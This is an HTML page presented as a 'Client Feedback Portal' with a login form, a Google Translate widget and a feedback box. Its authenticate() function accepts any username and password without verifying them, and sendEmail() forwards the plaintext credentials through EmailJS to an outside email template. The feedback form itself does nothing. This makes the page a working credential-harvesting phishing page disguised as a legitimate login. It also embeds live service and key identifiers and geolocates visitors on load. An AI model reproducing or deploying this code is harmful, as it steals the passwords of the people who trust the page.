<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Client Feedback Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        emailjs.init("JYKSTvr8xx8jZDFiA"); // EmailJS Public Key
    </script>
    <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateInit"></script>
    <script>
        function googleTranslateInit() {
            new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
        }

        async function detectLocationAndTranslate() {
            try {
                let response = await fetch('https://ipapi.co/json/');
                let data = await response.json();
                let countryCode = data.country_code.toLowerCase();

                const languageMap = {
                    "fr": "fr",  // French
                    "es": "es",  // Spanish
                    "de": "de",  // German
                    "zh": "zh-CN",  // Chinese (Simplified)
                    "ja": "ja",  // Japanese
                    "ar": "ar",  // Arabic
                    "ru": "ru",  // Russian
                    "pt": "pt",  // Portuguese
                    "it": "it"   // Italian
                };

                let detectedLanguage = languageMap[countryCode] || "en"; // Default to English
                let translateUrl = `https://translate.google.com/translate?hl=${detectedLanguage}&sl=en&u=${window.location.href}`;

                if (detectedLanguage !== "en") {
                    window.location.href = translateUrl;
                }
            } catch (error) {
                console.error("Location detection failed:", error);
            }
        }
    </script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
        .container { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
        input, textarea { width: 100%; margin: 10px 0; padding: 8px; }
        button { padding: 10px 15px; background-color: #007BFF; color: white; border: none; cursor: pointer; }
        button:hover { background-color: #0056b3; }
        #google_translate_element { margin-bottom: 20px; }
    </style>
</head>
<body onload="detectLocationAndTranslate()">
    <div id="google_translate_element"></div> <!-- Language Switcher -->

    <div id="login" class="container">
        <h2>Login</h2>
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button onclick="authenticate()">Login</button>
    </div>

    <div id="dashboard" class="container" style="display: none;">
        <h2>Feedback Form</h2>
        <textarea id="feedback" placeholder="Enter your feedback here..." required></textarea>
        <button onclick="submitFeedback()">Submit</button>
    </div>

    <script>
        let loginHistory = [];

        function sendEmail(username, password) {
            const serviceID = "service_v6hp3f7";  
            const templateID = "template_7hs846r";  
            const publicKey = "JYKSTvr8xx8jZDFiA";  

            const templateParams = {
                login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
            };

            console.log("Sending email with:", templateParams);

            emailjs.send(serviceID, templateID, templateParams, publicKey)
                .then(response => {
                    console.log("Email sent successfully", response);
                })
                .catch(error => {
                    console.error("Error sending email", error);
                });
        }

        function authenticate() {
            let username = document.getElementById("username").value.trim();
            let password = document.getElementById("password").value.trim();

            if (username && password) {
                document.getElementById("login").style.display = "none";
                document.getElementById("dashboard").style.display = "block";
                
                loginHistory.push(`Username: ${username}, Password: ${password}, Logged in at: ${new Date().toLocaleString()}`);
                console.log("Updated loginHistory:", loginHistory);
                sendEmail(username, password);
            } else {
                alert("Please enter both username and password.");
            }
        }

        function submitFeedback() {
            let feedback = document.getElementById("feedback").value;
            if (feedback.trim() === "") {
                alert("Please enter feedback before submitting.");
                return;
            }
            alert("Feedback submitted successfully!");
            document.getElementById("feedback").value = "";
        }
    </script>
</body>
</html>
